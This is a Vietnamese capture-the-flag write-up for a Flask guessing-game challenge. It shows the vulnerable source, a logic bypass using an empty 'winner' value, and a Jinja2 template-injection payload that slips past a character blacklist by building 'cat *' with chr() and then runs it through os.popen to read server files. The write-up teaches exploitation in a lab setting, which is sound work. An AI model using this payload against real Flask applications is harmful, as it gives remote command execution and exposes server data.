Đầu tiên là thắng game trước 

Ta được cho đoạn code backend 
```python
#IMPORT SECRET

app = Flask(__name__)
SESSION_TYPE = 'filesystem'
app.config.from_object(__name__)
Session(app)
authCode = "C4n 1 Trust Y0u? Player "


#Our bot detected that some users had gained access to the system by malicious function, so we decided to ban it.
blacklist = ["'", '"', "request", "readlines", "+", "%2b", "%22", '%27', "linecache", "add", "join"]

def authCheck(input):
        if session.get(input) == None:
                return ""
        return session.get(input)

@app.route("/", methods=["GET","POST"])
def index():
        try:
                session.pop("userCode")
                session.pop("winner")
        except:
                pass
        if request.method == "POST":
                ok = request.form['ok']
                for ban in blacklist:
                        if ban in request.form['name']:
                                return render_template_string('Hacker Alert!!!')
                session["userCode"] = request.form['name']
                if ok == "Let's play!":
                        session["check"] = "access"
                        #bypass this? No way haha :D
                        winner = " ".join(str(x) for x in [hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1)]).strip()
                        session["winner"] = winner
                        return render_template_string("Generating winner hash...<script>setInterval(function(){ window.location='/doanxem'; }, 500);</script>")
        return render_template("index.html")

@app.route('/doanxem', methods=["GET","POST"])
def doanxem():
        try:
                if authCheck("check") == "":
                        return render_template_string(authCode+authCheck("userCode"))
                else:
                        if request.method == "POST":
                                winner_input = request.form['winner']
                                if winner_input == authCheck("winner"):
                                        mess = "You are the real winner!!!!!!!!!! "+authCheck("userCode")+", here your flag: https://youtu.be/dQw4w9WgXcQ"
                                elif winner_input != authCheck("winner"):
                                        mess = "Wrong! You die!<script>setInterval(function(){ window.location='/choilai'; }, 1200);</script>"
                                return render_template_string(mess)
                        return render_template("doanxem.html")
        except:
                pass
        return render_template_string(authCode+authCheck("userCode"))

@app.route('/choilai')
def reset_access():
        try:
                session.pop("check")
                return render_template_string("You got an Extra Change. Gud luck :D!!!!!!<script>setInterval(function(){ window.location='/'; }, 500);</script>")
        except:
                pass
        return render_template_string(authCode+authCheck("userCode"))

if __name__ == "__main__":
        app.secret_key = '###########'
        serve(app, host='0.0.0.0', port = 8900)
```

Nhận thấy ở đây nếu `ok == "Let's play!"` thì mới gán giá trị ngẫu nhiên cho `winner`;vậy nếu `ok` không phải `Let's play!` thì giá trị `winner` sẽ là rỗng,khi đó ta chỉ cần gửi request POST với `winner` rỗng là sẽ thắng. 
```python
if ok == "Let's play!":
                        session["check"] = "access"
                        #bypass this? No way haha :D
                        winner = " ".join(str(x) for x in [hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1), hack(0,1)]).strip()
                        session["winner"] = winner
                        return render_template_string("Generating winner hash...<script>setInterval(function(){ window.location='/doanxem'; }, 500);</script>")
```

Thử là biết liền 

![test payload](https://i.imgur.com/0hJpVGw.png) 

Gửi request với `winner` rỗng 

![send payload](https://i.imgur.com/DrnWDt6.png) 

Ở đây nhận thấy server render ra giá trị của `name` nhận vào từ request,khả năng là lỗi XSS,SSTI. 

Test với `name={{7*7}}` 

![test SSTI](https://i.imgur.com/che9cOc.png)

Giá trị `name` nhận vào sẽ bị filter bởi `blacklist = ["'", '"', "request", "readlines", "+", "%2b", "%22", '%27', "linecache", "add", "join"]` ,không thể dùng các ký tự `'`,`"`,`+`,`request`,`readlines`,`linecache`,`add`,`join` và url encode của chúng nên phải tìm cách bypass qua filter này. 

Do không thể sử dụng `'` hay `"` nên ta sẽ tạo biến `cmd` bằng cách nối chuỗi ký tự. 

Biến `cmd` được gán giá trị `cat *` thông qua cách xây dựng từng ký tự bằng `chr()`.Hàm `chr()` chuyển một số nguyên (ASCII code) thành ký tự và dùng `~` để nối chuỗi.

```python
{% set cmd = 
cycler.__init__.__globals__.__builtins__.chr(99) ~
 cycler.__init__.__globals__.__builtins__.chr(97) ~
  cycler.__init__.__globals__.__builtins__.chr(116) ~
   cycler.__init__.__globals__.__builtins__.chr(32) ~
    cycler.__init__.__globals__.__builtins__.chr(42) %}
```
với `chr(99) → c` 
    `chr(97) → a` 
    `chr(116) → t` 
    `chr(32) → khoảng trắng ( )` 
    `chr(42) → *` 

Thực thi lệnh hệ thống với `os.popen()` : `cycler.__init__.__globals__.os.popen(cmd).read()` 

Payload 
```python
{% set cmd = cycler.__init__.__globals__.__builtins__.chr(99) ~ cycler.__init__.__globals__.__builtins__.chr(97) ~ cycler.__init__.__globals__.__builtins__.chr(116) ~ cycler.__init__.__globals__.__builtins__.chr(32) ~ cycler.__init__.__globals__.__builtins__.chr(42) %}{{ cycler.__init__.__globals__.os.popen(cmd).read() }}
``` 

Flag: CyRadar{@@@@@@Th3_n3Xt_l3v3l_pL4y!!!!!!!!}


